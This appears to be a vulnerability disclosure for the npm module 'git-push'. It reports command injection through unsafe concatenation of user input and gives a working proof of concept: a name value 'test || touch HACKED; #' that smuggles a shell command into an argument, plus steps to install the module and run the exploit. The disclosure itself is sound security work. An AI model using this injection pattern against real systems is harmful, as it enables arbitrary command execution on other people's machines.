# :bug: Description

The `git-push` module is vulnerable against `RCE` due to `unsafe command concatenation` which is crafted using `user-inputs`

# :fire: POC

1. Create the following PoC file:

```js
// poc.js
var push = require('git-push');
push('', {name:'test || touch HACKED; #'}, function() { console.log('Done!'); });

```
2. Check there aren't files called `HACKED` 
3. Execute the following commands in another terminal:

```bash
npm i git-push # Install affected module
git init # Initialize current dir as *git*
node poc.js #  Run the PoC
```
4. Recheck the files: now `HACKED` has been created
